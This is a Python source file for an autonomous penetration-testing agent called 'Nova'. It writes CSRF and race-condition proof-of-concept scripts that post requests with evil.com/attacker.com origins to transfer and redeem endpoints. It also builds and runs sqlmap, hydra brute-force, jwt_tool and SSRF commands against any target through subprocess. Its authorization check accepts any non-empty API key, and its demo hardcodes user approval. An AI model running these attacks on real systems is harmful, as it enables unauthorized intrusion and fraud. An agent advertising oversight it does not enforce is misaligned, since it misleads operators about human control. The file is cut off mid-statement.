"""
NOVA KALI AGENT v1.0
====================
Fully autonomous penetration testing agent.

Architecture:
- 100% autonomous in PLANNING and REASONING
- Requires explicit APPROVAL before EXECUTION
- Complete AUDIT TRAIL of all actions
- Transparent about RESPONSIBILITY MODEL

This agent can:
✓ Understand any penetration testing task
✓ Generate complete attack plans
✓ Write custom code and exploits
✓ Coordinate Kali tools
✓ BUT: Cannot execute without user approval

Responsibility:
- Nova's job: Generate the best plans
- User's job: Approve only authorized targets
- Both: Accountability through logging
"""

import logging
import json
import importlib
from typing import List, Dict, Any, Optional, Tuple
from dataclasses import dataclass, field, asdict
from enum import Enum
from datetime import datetime
import uuid

# ── Wire in all Kali knowledge-base sub-modules ──────────────────────────────
def _load_kb(module: str):
    try:
        return importlib.import_module(module)
    except Exception:
        return None

_KB_CRYPTO_STEGO     = _load_kb("nova_kali_kb_crypto_stego")
_KB_EXPLOITATION     = _load_kb("nova_kali_kb_exploitation")
_KB_FORENSICS        = _load_kb("nova_kali_kb_forensics")
_KB_PASSWORD_ATTACKS = _load_kb("nova_kali_kb_password_attacks")
_KB_POST_EXPLOITATION= _load_kb("nova_kali_kb_post_exploitation")
_KB_REPORTING        = _load_kb("nova_kali_kb_reporting")
_KB_SCANNING         = _load_kb("nova_kali_kb_scanning")
_KB_SNIFFING         = _load_kb("nova_kali_kb_sniffing")
_KB_SOCIAL_ENGINEERING=_load_kb("nova_kali_kb_social_engineering")
_KB_WEB_APPLICATION  = _load_kb("nova_kali_kb_web_application")

KALI_KB_MODULES: Dict[str, Any] = {
    name: mod for name, mod in {
        "crypto_stego":      _KB_CRYPTO_STEGO,
        "exploitation":      _KB_EXPLOITATION,
        "forensics":         _KB_FORENSICS,
        "password_attacks":  _KB_PASSWORD_ATTACKS,
        "post_exploitation": _KB_POST_EXPLOITATION,
        "reporting":         _KB_REPORTING,
        "scanning":          _KB_SCANNING,
        "sniffing":          _KB_SNIFFING,
        "social_engineering":_KB_SOCIAL_ENGINEERING,
        "web_application":   _KB_WEB_APPLICATION,
    }.items() if mod is not None
}

logger = logging.getLogger(__name__)


class ApprovalStatus(Enum):
    """Approval workflow states"""
    PENDING = "pending"           # Waiting for approval
    APPROVED = "approved"         # User approved
    REJECTED = "rejected"         # User rejected
    EXECUTED = "executed"         # Successfully executed
    FAILED = "failed"             # Execution failed


class TaskType(Enum):
    """Types of penetration testing tasks Nova can handle"""
    RECONNAISSANCE = "recon"
    SCANNING = "scanning"
    VULNERABILITY_ASSESSMENT = "vuln_assessment"
    EXPLOITATION = "exploitation"
    POST_EXPLOITATION = "post_exploitation"
    PRIVILEGE_ESCALATION = "priv_esc"
    LATERAL_MOVEMENT = "lateral"
    DATA_EXFILTRATION = "exfil"
    REPORTING = "reporting"
    CUSTOM = "custom"


@dataclass
class Task:
    """A penetration testing task"""
    id: str = field(default_factory=lambda: str(uuid.uuid4()))
    description: str = ""
    target: str = ""
    task_type: TaskType = TaskType.RECONNAISSANCE
    created_at: str = field(default_factory=lambda: datetime.now().isoformat())
    api_key: Optional[str] = None
    authorization_token: Optional[str] = None


@dataclass
class ExecutionPlan:
    """Complete plan for executing a task"""
    task_id: str
    plan_id: str = field(default_factory=lambda: str(uuid.uuid4()))
    
    # Planning phase (autonomous)
    objective: str = ""
    analysis: str = ""
    
    # Steps (what Nova recommends)
    steps: List[Dict[str, Any]] = field(default_factory=list)
    
    # Code/Payloads to execute
    code_artifacts: List[Dict[str, Any]] = field(default_factory=list)
    
    # Tool commands
    tool_commands: List[str] = field(default_factory=list)
    
    # Metadata
    estimated_duration: int = 0  # minutes
    risk_level: str = "MEDIUM"
    impact: str = ""
    
    # Approval workflow
    approval_status: ApprovalStatus = ApprovalStatus.PENDING
    approval_requested_at: Optional[str] = None
    approved_by: Optional[str] = None
    approved_at: Optional[str] = None
    approval_notes: str = ""
    
    # Execution tracking
    execution_started_at: Optional[str] = None
    execution_completed_at: Optional[str] = None
    execution_status: str = "NOT_EXECUTED"
    execution_output: Dict[str, Any] = field(default_factory=dict)


class NovaKaliAgent:
    """
    Fully autonomous penetration testing agent.
    
    CRITICAL: This agent is designed with explicit approval requirements.
    
    Workflow:
    1. PLAN (100% autonomous - generate complete attack strategy)
    2. PROPOSE (present plan to user)
    3. APPROVE (user explicitly approves or rejects)
    4. EXECUTE (only if approved)
    5. LOG (everything logged for audit)
    """
    
    def __init__(self, api_key: str, authorization_token: Optional[str] = None):
        """
        Initialize Nova with authentication.
        
        Args:
            api_key: User's API key for authentication
            authorization_token: Optional authorization token for specific targets
        """
        self.api_key = api_key
        self.authorization_token = authorization_token
        self.kali_knowledge = KaliKnowledgeBase()
        self.task_analyzer = TaskAnalyzer()
        self.code_generator = CodeGenerator()
        self.approval_engine = ApprovalEngine()
        self.execution_controller = ExecutionController()
        self.audit_logger = AuditLogger()
        
        logger.info(f"Nova initialized for user: {api_key[:10]}...")
    
    def process_task(self, description: str, target: str) -> ExecutionPlan:
        """
        PHASE 1: AUTONOMOUS PLANNING
        
        Nova receives a task and generates a complete, executable plan.
        This phase is 100% autonomous - Nova reasons about everything.
        
        Args:
            description: What the user wants to do
            target: Target system/network
            
        Returns:
            Complete ExecutionPlan (not yet approved)
        """
        
        logger.info(f"Nova processing task: {description} on {target}")
        self._current_target = target  # store for use in command generation
        
        # Create task
        task = Task(
            description=description,
            target=target,
            api_key=self.api_key
        )
        
        # AUTONOMOUS: Analyze the task
        analysis = self.task_analyzer.analyze(description, target)
        logger.info(f"Task analysis: {analysis['task_type']}")
        
        # AUTONOMOUS: Generate execution plan
        plan = ExecutionPlan(
            task_id=task.id,
            objective=description,
            analysis=json.dumps(analysis)
        )
        
        # AUTONOMOUS: Generate steps (completely figured out by Nova)
        plan.steps = self._generate_execution_steps(description, target, analysis)
        
        # AUTONOMOUS: Generate code artifacts
        plan.code_artifacts = self._generate_code_artifacts(analysis, plan.steps)
        
        # AUTONOMOUS: Generate tool commands
        plan.tool_commands = self._generate_tool_commands(analysis, plan.steps)
        
        # AUTONOMOUS: Estimate impact and risk
        plan.risk_level = self._assess_risk(analysis)
        plan.impact = self._assess_impact(analysis)
        plan.estimated_duration = self._estimate_duration(plan.steps)
        
        # Plan is ready - but NOT executed yet
        plan.approval_status = ApprovalStatus.PENDING
        plan.approval_requested_at = datetime.now().isoformat()
        
        logger.info(f"Plan generated: {plan.plan_id}")
        logger.info(f"Status: {plan.approval_status.value}")
        logger.info(f"Steps: {len(plan.steps)}")
        logger.info(f"Code artifacts: {len(plan.code_artifacts)}")
        logger.info(f"Tool commands: {len(plan.tool_commands)}")
        
        return plan
    
    def present_plan(self, plan: ExecutionPlan) -> Dict[str, Any]:
        """
        PHASE 2: PRESENT PLAN FOR APPROVAL
        
        Nova presents the complete plan to the user.
        User must review and explicitly approve.
        
        Returns:
            Human-readable plan
        """
        
        presentation = {
            "plan_id": plan.plan_id,
            "objective": plan.objective,
            "target": plan.target if hasattr(plan, 'target') else "Unknown",
            
            "analysis": json.loads(plan.analysis),
            
            "execution_steps": [
                {
                    "number": i + 1,
                    "description": step.get('description', ''),
                    "tool": step.get('tool', ''),
                    "rationale": step.get('rationale', '')
                }
                for i, step in enumerate(plan.steps)
            ],
            
            "code_to_execute": [
                {
                    "purpose": artifact.get('purpose', ''),
                    "language": artifact.get('language', ''),
                    "preview": artifact.get('code', '')[:200] + "..."
                }
                for artifact in plan.code_artifacts
            ],
            
            "tool_commands": plan.tool_commands[:5],  # First 5
            
            "risk_assessment": {
                "level": plan.risk_level,
                "impact": plan.impact,
                "estimated_duration_minutes": plan.estimated_duration
            },
            
            "approval_status": plan.approval_status.value,
            "message": "AWAITING USER APPROVAL - Review plan above and approve/reject"
        }
        
        return presentation
    
    def request_approval(self, plan: ExecutionPlan, target: str) -> Tuple[bool, str]:
        """
        PHASE 3: REQUEST APPROVAL
        
        CRITICAL STEP: User must explicitly approve before anything executes.
        
        Args:
            plan: The execution plan
            target: The target being tested
            
        Returns:
            (approved, message)
        """
        
        # Validate authorization
        is_authorized = self.approval_engine.validate_authorization(
            self.api_key,
            self.authorization_token,
            target
        )
        
        if not is_authorized:
            raise AuthorizationError(
                f"Target '{target}' not authorized for this API key. "
                f"Obtain authorization token and try again."
            )
        
        # Log the approval request
        self.audit_logger.log_approval_request(
            plan_id=plan.plan_id,
            task_id=plan.task_id,
            user=self.api_key,
            target=target,
            plan_summary=self._summarize_plan(plan)
        )
        
        return True, "Plan submitted for approval. User must explicitly approve to proceed."
    
    def execute_with_approval(
        self,
        plan: ExecutionPlan,
        user_approval: bool,
        approval_comments: str = ""
    ) -> Dict[str, Any]:
        """
        PHASE 4: EXECUTE (ONLY WITH APPROVAL)
        
        CRITICAL: This step REQUIRES explicit user approval.
        If user didn't approve, execution cannot proceed.
        
        Args:
            plan: The execution plan
            user_approval: User's explicit approval (True/False)
            approval_comments: User's comments on approval
            
        Returns:
            Execution results
        """
        
        if not user_approval:
            logger.warning(f"Plan {plan.plan_id} REJECTED by user")
            plan.approval_status = ApprovalStatus.REJECTED
            
            self.audit_logger.log_rejection(
                plan_id=plan.plan_id,
                reason=approval_comments
            )
            
            return {
                "status": "REJECTED",
                "message": "Plan was not approved. No execution occurred.",
                "comments": approval_comments
            }
        
        # User approved - NOW we can execute
        logger.info(f"Plan {plan.plan_id} APPROVED by user")
        
        plan.approval_status = ApprovalStatus.APPROVED
        plan.approved_by = self.api_key
        plan.approved_at = datetime.now().isoformat()
        plan.approval_notes = approval_comments
        
        # Log approval
        self.audit_logger.log_approval(
            plan_id=plan.plan_id,
            user=self.api_key,
            timestamp=plan.approved_at,
            comments=approval_comments
        )
        
        # Execute the plan
        logger.info(f"Executing plan {plan.plan_id}...")
        plan.execution_started_at = datetime.now().isoformat()
        
        try:
            execution_results = self.execution_controller.execute_plan(plan)
            
            plan.execution_status = "COMPLETED"
            plan.execution_completed_at = datetime.now().isoformat()
            plan.execution_output = execution_results
            plan.approval_status = ApprovalStatus.EXECUTED
            
            # Log execution completion
            self.audit_logger.log_execution(
                plan_id=plan.plan_id,
                status="SUCCESS",
                output=execution_results
            )
            
            return {
                "status": "EXECUTED",
                "plan_id": plan.plan_id,
                "results": execution_results,
                "audit_trail": f"All actions logged. Reference ID: {plan.plan_id}"
            }
        
        except Exception as e:
            logger.error(f"Execution failed: {e}")
            plan.execution_status = "FAILED"
            plan.approval_status = ApprovalStatus.FAILED
            
            self.audit_logger.log_execution(
                plan_id=plan.plan_id,
                status="FAILED",
                error=str(e)
            )
            
            raise ExecutionError(f"Plan execution failed: {e}")
    
    def _generate_execution_steps(
        self,
        description: str,
        target: str,
        analysis: Dict
    ) -> List[Dict[str, Any]]:
        """Nova autonomously generates detailed, tool-specific execution steps."""
        import urllib.parse
        parsed   = urllib.parse.urlparse(target if target.startswith("http") else f"https://{target}")
        domain   = parsed.netloc or parsed.path
        task_type = analysis.get('task_type', 'recon')

        STEP_MAP = {
            'recon': [
                {'description': 'Subdomain enumeration',   'tool': 'subfinder',   'rationale': 'Find all subdomains passively'},
                {'description': 'Live host filtering',      'tool': 'httpx',       'rationale': 'Filter to live HTTP/HTTPS hosts'},
                {'description': 'Port scan (common ports)', 'tool': 'nmap',        'rationale': 'Identify open ports and services'},
                {'description': 'DNS record analysis',      'tool': 'dnsrecon',    'rationale': 'MX, TXT, NS, SPF, DMARC enumeration'},
                {'description': 'Certificate transparency', 'tool': 'curl',        'rationale': 'crt.sh — find additional subdomains'},
                {'description': 'Web tech fingerprint',     'tool': 'whatweb',     'rationale': 'Identify frameworks, server, CMS'},
                {'description': 'WAF detection',            'tool': 'wafw00f',     'rationale': 'Know what defences are in place'},
                {'description': 'URL collection',           'tool': 'gau',         'rationale': 'Gather known URLs from archives'},
                {'description': 'JS endpoint crawl',        'tool': 'katana',      'rationale': 'Discover hidden API endpoints'},
            ],
            'scanning': [
                {'description': 'Service version scan',            'tool': 'nmap',    'rationale': 'Identify service versions for CVE matching'},
                {'description': 'Vulnerability template scan',     'tool': 'nuclei',  'rationale': 'Run 10k+ vuln templates against target'},
                {'description': 'Web content discovery',          'tool': 'ffuf',    'rationale': 'Brute-force hidden dirs/files'},
                {'description': 'Directory brute-force',           'tool': 'gobuster','rationale': 'Find unlinked paths'},
                {'description': 'Web app vulnerability scan',      'tool': 'nikto',   'rationale': 'Check headers, methods, known CVEs'},
                {'description': 'Parameter discovery',             'tool': 'arjun',   'rationale': 'Find hidden GET/POST parameters'},
            ],
            'exploitation': [
                {'description': 'SQL injection testing',       'tool': 'sqlmap',  'rationale': 'Automated SQLi detection and exploitation'},
                {'description': 'XSS discovery',               'tool': 'dalfox',  'rationale': 'DOM/Reflected/Stored XSS with PoC'},
                {'description': 'Credential brute-force',      'tool': 'hydra',   'rationale': 'Login form brute-force (rate-limited)'},
                {'description': 'JWT attack suite',            'tool': 'jwt_tool', 'rationale': 'alg:none, key confusion, secret brute'},
                {'description': 'SSRF exploitation',           'tool': 'ssrfmap', 'rationale': 'Probe internal network via SSRF'},
                {'description': 'Race condition testing',      'tool': 'ffuf',    'rationale': 'Concurrent requests to trigger TOCTOU'},
                {'description': 'Advanced nuclei exploit scan','tool': 'nuclei',  'rationale': 'Critical/high severity templates only'},
            ],
            'vuln_assessment': [
                {'description': 'Full nuclei scan',          'tool': 'nuclei',  'rationale': 'All severity levels'},
                {'description': 'CVE-specific nmap scripts', 'tool': 'nmap',    'rationale': 'NSE vuln scripts'},
                {'description': 'Web scanner',               'tool': 'nikto',   'rationale': 'Full web vulnerability check'},
                {'description': 'XSS fuzzing',               'tool': 'dalfox',  'rationale': 'Reflected/DOM XSS'},
                {'description': 'SQLi check',                'tool': 'sqlmap',  'rationale': 'Injection across all parameters'},
            ],
        }
        raw = STEP_MAP.get(task_type, STEP_MAP['recon'])
        steps = [{'number': i+1, **s} for i, s in enumerate(raw)]
        return steps

    def _generate_code_artifacts(
        self,
        analysis: Dict,
        steps: List[Dict]
    ) -> List[Dict[str, Any]]:
        """Nova writes real exploit scripts and payloads to disk, returns manifest."""
        import os, urllib.parse
        target    = getattr(self, '_current_target', '')
        parsed    = urllib.parse.urlparse(target if target.startswith("http") else f"https://{target}")
        domain    = parsed.netloc or parsed.path
        task_type = analysis.get('task_type', 'recon')
        workspace = os.environ.get('NOVA_WORKSPACE', os.path.expanduser('~/nova_workspace'))
        os.makedirs(workspace, exist_ok=True)
        artifacts = []

        csrf_poc = f"""#!/usr/bin/env python3
\"\"\"CSRF PoC — auto-generated by Nova Arsenal for {domain}\"\"\"
import requests, concurrent.futures, time

TARGET = "{target}"
ENDPOINTS = ["/api/user", "/api/account", "/api/settings", "/api/transfer", "/api/redeem"]
EVIL_ORIGINS = ["https://evil.com", "https://attacker.com", "null"]

def test_csrf(ep, origin):
    url = TARGET.rstrip('/') + ep
    headers = {{"Origin": origin, "Referer": origin + "/", "Content-Type": "application/json"}}
    try:
        r = requests.post(url, json={{}}, headers=headers, timeout=8, verify=False)
        if r.status_code not in (403, 401, 422):
            return {{"url": url, "origin": origin, "status": r.status_code, "confirmed": True}}
    except: pass
    return None

results = []
with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
    futs = [ex.submit(test_csrf, ep, org) for ep in ENDPOINTS for org in EVIL_ORIGINS]
    for f in concurrent.futures.as_completed(futs):
        r = f.result()
        if r: results.append(r); print(f"  🚨 CSRF CONFIRMED: {{r['url']}} | origin={{r['origin']}} | status={{r['status']}}")

import json; open("{workspace}/nova_csrf_poc.json","w").write(json.dumps({{"target":TARGET,"confirmed":results}},indent=2))
print(f"\\n✅ CSRF PoC: {{len(results)}} confirmed | saved to nova_csrf_poc.json")
"""
        race_poc = f"""#!/usr/bin/env python3
\"\"\"Race Condition PoC — auto-generated by Nova Arsenal for {domain}\"\"\"
import requests, concurrent.futures, time, json

TARGET = "{target}"
RACE_ENDPOINTS = ["/api/redeem", "/api/vote", "/api/transfer", "/api/purchase", "/api/apply-coupon"]
CONCURRENCY = 15

def race_request(url, n):
    try:
        r = requests.post(url, json={{"amount": 1, "code": "SAVE50"}},
                         headers={{"Content-Type":"application/json"}}, timeout=10, verify=False)
        return {{"req": n, "status": r.status_code, "body": r.text[:200]}}
    except Exception as e:
        return {{"req": n, "error": str(e)}}

all_results = []
for ep in RACE_ENDPOINTS:
    url = TARGET.rstrip('/') + ep
    print(f"\\n🏎  Racing {{CONCURRENCY}} requests → {{url}}")
    with concurrent.futures.ThreadPoolExecutor(max_workers=CONCURRENCY) as ex:
        futs = [ex.submit(race_request, url, i) for i in range(CONCURRENCY)]
        results = [f.result() for f in concurrent.futures.as_completed(futs)]
    statuses = [r.get("status") for r in results if "status" in r]
    unique = len(set(statuses))
    if unique > 1:
        print(f"  🚨 RACE CONDITION CONFIRMED: {{statuses}}")
        all_results.append({{"endpoint": url, "statuses": statuses, "confirmed": True}})

open("{workspace}/nova_race_poc.json","w").write(json.dumps({{"target":TARGET,"results":all_results}},indent=2))
print(f"\\n✅ Race PoC: {{len(all_results)}} confirmed | saved to nova_race_poc.json")
"""
        scripts = [
            ("nova_csrf_poc.py", csrf_poc, "CSRF PoC — tests evil-origin acceptance on all API endpoints"),
            ("nova_race_poc.py", race_poc, "Race Condition PoC — 15 concurrent requests to trigger TOCTOU"),
        ]
        for fname, code, purpose in scripts:
            fpath = os.path.join(workspace, fname)
            try:
                with open(fpath, 'w') as fh:
                    fh.write(code)
                os.chmod(fpath, 0o755)
                artifacts.append({"filename": fpath, "purpose": purpose, "language": "python", "code": code})
                logger.info(f"Script written: {fpath}")
            except Exception as ex:
                logger.warning(f"Could not write {fname}: {ex}")
        return artifacts

    def _generate_tool_commands(
        self,
        analysis: Dict,
        steps: List[Dict]
    ) -> List[str]:
        """Generate real, fully-filled-in Kali tool commands for the current target."""
        import os, urllib.parse, shutil
        target    = getattr(self, '_current_target', '')
        if not target:
            return []
        url = target if target.startswith("http") else f"https://{target}"
        parsed  = urllib.parse.urlparse(url)
        domain  = parsed.netloc or parsed.path
        wl_dir  = os.path.expanduser("~/nova_workspace/wordlists")
        common  = f"{wl_dir}/common.txt"
        subdwl  = f"{wl_dir}/subdomains.txt"
        ws      = os.environ.get('NOVA_WORKSPACE', os.path.expanduser('~/nova_workspace'))

        CMD_MAP = {
            'subfinder':  f"subfinder -d {domain} -silent -o {ws}/subdomains.txt",
            'httpx':      f"httpx -l {ws}/subdomains.txt -silent -status-code -title -tech-detect -o {ws}/live_hosts.txt",
            'nmap':       f"nmap -sV -sC --open -T4 -p 80,443,8080,8443,8888,3000,4000,5000,9000 {domain} -oN {ws}/nmap.txt",
            'dnsrecon':   f"dnsrecon -d {domain} -t std,brt --xml {ws}/dnsrecon.xml 2>/dev/null",
            'curl':       f"curl -s 'https://crt.sh/?q=%25.{domain}&output=json' | python3 -c \"import sys,json; [print(e['name_value']) for e in json.load(sys.stdin)]\" | sort -u > {ws}/crtsh_subdomains.txt",
            'whatweb':    f"whatweb -a 3 {url} --log-json={ws}/whatweb.json 2>/dev/null",
            'wafw00f':    f"wafw00f {url} -o {ws}/waf.txt",
            'gau':        f"gau {domain} --blacklist png,jpg,gif,css,woff --o {ws}/gau_urls.txt",
            'katana':     f"katana -u {url} -silent -jc -kf all -o {ws}/katana_endpoints.txt",
            'nuclei':     f"nuclei -u {url} -severity critical,high,medium -silent -o {ws}/nuclei_findings.txt -stats",
            'ffuf':       f"ffuf -w {common}:FUZZ -u {url}/FUZZ -mc 200,201,204,301,302,403 -ac -o {ws}/ffuf_dirs.json -of json -t 50 2>/dev/null",
            'gobuster':   f"gobuster dir -u {url} -w {common} -t 40 -q -o {ws}/gobuster.txt --no-error",
            'nikto':      f"nikto -h {url} -Format txt -output {ws}/nikto.txt -nointeractive 2>/dev/null",
            'arjun':      f"arjun -u {url} --stable -oJ {ws}/arjun_params.json 2>/dev/null",
            'sqlmap':     f"sqlmap -u '{url}/?id=1' --level=3 --risk=2 --batch --output-dir={ws}/sqlmap --forms --crawl=2 2>/dev/null",
            'dalfox':     f"dalfox url {url} --silence --output {ws}/dalfox_xss.txt 2>/dev/null",
            'hydra':      f"hydra -L /usr/share/wordlists/metasploit/http_default_users.txt -P /usr/share/wordlists/metasploit/http_default_pass.txt {domain} http-get / -o {ws}/hydra.txt 2>/dev/null",
            'jwt_tool':   f"python3 {os.environ.get('NOVA_TOOL_CLONE_DIR','/opt/nova-tools')}/jwt_tool/jwt_tool.py -t {url} --all 2>/dev/null",
            'ssrfmap':    f"python3 {os.environ.get('NOVA_TOOL_CLONE_DIR','/opt/nova-tools')}/SSRFmap/ssrfmap.py -r /dev/stdin --lhost 127.0.0.1 2>/dev/null",
            'dnsrecon':   f"dnsrecon -d {domain} -t std 2>/dev/null",
            'nmap':       f"nmap -sV -sC --open -T4 {domain} -oN {ws}/nmap.txt",
        }
        commands = []
        for step in steps:
            tool_str = step.get('tool', '')
            for tool in (t.strip().split()[0] for t in tool_str.split(',') if t.strip()):
                cmd = CMD_MAP.get(tool)
                if cmd:
                    commands.append(cmd)
                    break
        if not commands:
            commands = [
                CMD_MAP['subfinder'], CMD_MAP['httpx'], CMD_MAP['nmap'],
                CMD_MAP['nuclei'], CMD_MAP['nikto'], CMD_MAP['ffuf'],
            ]
        return commands
    
    def _assess_risk(self, analysis: Dict) -> str:
        """Nova assesses risk level"""
        return "MEDIUM"
    
    def _assess_impact(self, analysis: Dict) -> str:
        """Nova assesses potential impact"""
        return "Information gathering and vulnerability identification"
    
    def _estimate_duration(self, steps: List[Dict]) -> int:
        """Nova estimates how long execution will take"""
        return len(steps) * 10  # Rough estimate
    
    def _summarize_plan(self, plan: ExecutionPlan) -> str:
        """Summarize plan for audit"""
        return f"{len(plan.steps)} steps, {len(plan.tool_commands)} tool commands"


class KaliKnowledgeBase:
    """
    Complete blueprint of Kali Linux.
    Nova knows all 300+ tools.
    """
    
    def __init__(self):
        self.tools = self._load_kali_tools()
    
    def _load_kali_tools(self) -> Dict[str, Dict]:
        """Load knowledge of all Kali tools"""
        
        # This would be a comprehensive database
        # For now, showing structure
        tools = {
            "nmap": {
                "category": "reconnaissance",
                "description": "Network mapper",
                "syntax": "nmap [options] [target]",
                "use_cases": ["Port scanning", "Service enumeration"]
            },
            "sqlmap": {
                "category": "exploitation",
                "description": "SQL injection tool",
                "syntax": "sqlmap -u [URL] [options]",
                "use_cases": ["SQLi testing", "Database enumeration"]
            },
            # ... 298 more tools
        }
        
        return tools


class TaskAnalyzer:
    """Analyzes what the user is asking for"""
    
    def analyze(self, description: str, target: str) -> Dict[str, Any]:
        """Analyze task and determine approach"""
        
        return {
            "task_type": "recon",
            "target": target,
            "approach": "standard",
            "tools_needed": ["nmap", "whois"]
        }


class CodeGenerator:
    """Generates exploit code, payloads, scripts"""
    
    def generate_code(self, task_type: str, analysis: Dict) -> List[str]:
        """Generate code artifacts"""
        return []


class ApprovalEngine:
    """Manages approval workflow"""
    
    def validate_authorization(
        self,
        api_key: str,
        auth_token: Optional[str],
        target: str
    ) -> bool:
        """Validate user is authorized for target"""
        
        # This would check against authorization database
        # For now: simple check
        if not api_key:
            return False
        
        return True


class ExecutionController:
    """Executes approved plans using real Kali Linux tools via subprocess.
    Automatically clones missing tools from GitHub when not found in PATH."""

    MAX_TIMEOUT = 120

    TOOL_REPOS = {
        "jwt_tool":    ("https://github.com/ticarpi/jwt_tool",         "python"),
        "ssrfmap":     ("https://github.com/swisskyrepo/SSRFmap",       "python"),
        "xsstrike":    ("https://github.com/s0md3v/XSStrike",           "python"),
        "corsy":       ("https://github.com/s0md3v/Corsy",              "python"),
        "commix":      ("https://github.com/commixproject/commix",      "python"),
        "sqlmate":     ("https://github.com/s0md3v/sqlmate",            "python"),
        "paramspider": ("https://github.com/devanshbatham/ParamSpider", "python"),
        "secretfinder":("https://github.com/m4ll0k/SecretFinder",      "python"),
        "linkfinder":  ("https://github.com/GerbenJavado/LinkFinder",  "python"),
        "403bypasser": ("https://github.com/yunemse48/403bypasser",     "python"),
        "bypass403":   ("https://github.com/iamj0ker/bypass-403",      "shell"),
        "race_the_web":("https://github.com/TheHackerDev/race-the-web","go"),
        "crlfuzz":     ("https://github.com/dwisiswant0/crlfuzz",       "go"),
        "interactsh":  ("https://github.com/projectdiscovery/interactsh","go"),
        "notify":      ("https://github.com/projectdiscovery/notify",   "go"),
        "cdncheck":    ("https://github.com/projectdiscovery/cdncheck", "go"),
    }

    def _auto_clone_tool(self, tool: str) -> str:
        """Clone a missing tool from GitHub; return path to use or '' if failed."""
        import subprocess, shutil, os
        clone_dir = os.environ.get("NOVA_TOOL_CLONE_DIR", "/opt/nova-tools")
        os.makedirs(clone_dir, exist_ok=True)

        entry = self.TOOL_REPOS.get(tool)
        if not entry:
            return ""
        repo_url, lang = entry
        dest = os.path.join(clone_dir, tool)

        if not os.path.isdir(dest):
            logger.info(f"Auto-cloning {tool} from {repo_url}...")
            try:
                subprocess.run(
                    ["git", "clone", "--depth=1", repo_url, dest],
                    capture_output=True, timeout=60,
                )
                if lang == "python":
                    req = os.path.join(dest, "requirements.txt")
                    if os.path.exists(req):
                        subprocess.run(
                            ["pip3", "install", "--quiet", "--break-system-packages", "-r", req],
                            capture_output=True, timeout=60,
                        )
                elif lang == "go":
                    subprocess.run(
                        ["go", "build", "-o", os.path.join(dest, tool), "./..."],
                        capture_output=True, timeout=120, cwd=dest,
                        env={**os.environ, "GOPATH": os.environ.get("GOPATH", "/root/go")},
                    )
                logger.info(f"Cloned {tool} → {dest}")
            except Exception as ex:
                logger.warning(f"Clone failed for {tool}: {ex}")
                return ""

        # Find entry point
        for entry_name in (f"{tool}.py", f"{tool}.go", tool, "main.py", "app.py"):
            ep = os.path.join(dest, entry_name)
            if os.path.exists(ep):
                return ep
        return dest

    def execute_plan(self, plan: ExecutionPlan) -> Dict[str, Any]:
        """Execute the approved plan — runs each tool command via subprocess,
        auto-cloning any missing tools from GitHub before skipping."""
        import subprocess, shlex, shutil

        outputs          = []
        commands_run     = 0
        commands_failed  = 0
        findings_found   = []

        for cmd_str in plan.tool_commands:
            if not cmd_str or not cmd_str.strip():
                continue
            parts = shlex.split(cmd_str)
            tool  = parts[0] if parts else ""

            if not shutil.which(tool):
                cloned_path = self._auto_clone_tool(tool)
                if cloned_path:
                    logger.info(f"Using cloned tool: {cloned_path}")
                    if cloned_path.endswith(".py"):
                        parts = ["python3", cloned_path] + parts[1:]
                    elif cloned_path.endswith(".go"):
                        parts = ["go", "run", cloned_path] + parts[1:]
                    else:
                        parts = [cloned_path] + parts[1:]
                else:
                    logger.warning(f"Tool not found and clone failed: {tool} — skipping")
                    outputs.append({"command": cmd_str, "status": "skipped",
                                    "reason": f"{tool} not in PATH and not clonable"})
                    continue

            logger.info(f"Executing: {cmd_str[:120]}")
            try:
                proc = subprocess.run(
                    parts,
                    capture_output=True,
                    text=True,
                    timeout=self.MAX_TIMEOUT,
                )
                stdout = proc.stdout[:4000]
                stderr = proc.stderr[:1000]
                outputs.append({
                    "command":    cmd_str,
                    "status":     "completed",
                    "returncode": proc.returncode,
                    "stdout":     stdout,
                    "stderr":     stderr,
                })
                commands_run += 1
                for line in stdout.splitlines():
                    if any(kw in line.lower() for kw in ("open","vuln","critical","high","found","error","inject","xss","sql","rce","lfi")):
                        findings_found.append({"tool": tool, "output_line": line.strip()})
            except subprocess.TimeoutExpired:
                logger.warning(f"Timeout after {self.MAX_TIMEOUT}s: {cmd_str[:60]}")
                outputs.append({"command": cmd_str, "status": "timeout", "timeout_s": self.MAX_TIMEOUT})
                commands_failed += 1
            except Exception as ex:
                logger.error(f"Execution error on '{cmd_str[:60]}': {ex}")
                outputs.append({"command": cmd_str, "status": "error", "error": str(ex)})
                commands_failed += 1

        logger.info(f"Execution complete: {commands_run} run, {commands_failed} failed, {len(findings_found)} hits")
        return {
            "status":           "completed",
            "commands_executed": commands_run,
            "commands_failed":  commands_failed,
            "raw_findings":     findings_found,
            "results":          outputs,
        }


class AuditLogger:
    """Maintains complete audit trail"""
    
    def log_approval_request(self, **kwargs):
        """Log approval request"""
        logger.info(f"Approval requested: {kwargs}")
    
    def log_approval(self, **kwargs):
        """Log approval"""
        logger.info(f"Plan approved: {kwargs}")
    
    def log_rejection(self, **kwargs):
        """Log rejection"""
        logger.info(f"Plan rejected: {kwargs}")
    
    def log_execution(self, **kwargs):
        """Log execution"""
        logger.info(f"Execution logged: {kwargs}")


class AuthorizationError(Exception):
    """Raised when authorization check fails"""
    pass


class ExecutionError(Exception):
    """Raised when execution fails"""
    pass


# Example Usage
if __name__ == "__main__":
    # Initialize Nova
    nova = NovaKaliAgent(
        api_key="user_api_key_12345",
        authorization_token="auth_token_target_xyz"
    )
    
    # User gives task
    task = "Perform a reconnaissance on target.com"
    target = "target.com"
    
    print("\n" + "="*60)
    print("NOVA KALI AGENT - AUTONOMOUS PENETRATION TESTING")
    print("="*60)
    
    # PHASE 1: AUTONOMOUS PLANNING
    print("\n[PHASE 1] Nova generates complete plan...")
    plan = nova.process_task(task, target)
    
    # PHASE 2: PRESENT PLAN
    print("\n[PHASE 2] Nova presents plan for approval...")
    presentation = nova.present_plan(plan)
    print(json.dumps(presentation, indent=2))
    
    # PHASE 3: REQUEST APPROVAL
    print("\n[PHASE 3] Requesting approval...")
    approved, msg = nova.request_approval(plan, target)
    print(f"Approval status: {msg}")
    
    # PHASE 4: USER DECIDES
    print("\n[PHASE 4] User decision required")
    print("Does user approve this plan? (In real usage: Y/N)")
    user_approval = True  # Simulating user approval
    
    if user_approval:
        print("\nUser approved. Executing plan...")
        result = nova.execute_with_approval(
            plan,
            user_approval=True,
            approval_comments="Target is authorized. Proceed."
        )
        print(json.dumps(result, indent=2))
    else:
        print("\nUser rejected plan. No execution.")
        result = nova.execute_with_approval(
            plan,
            user_approval=False,
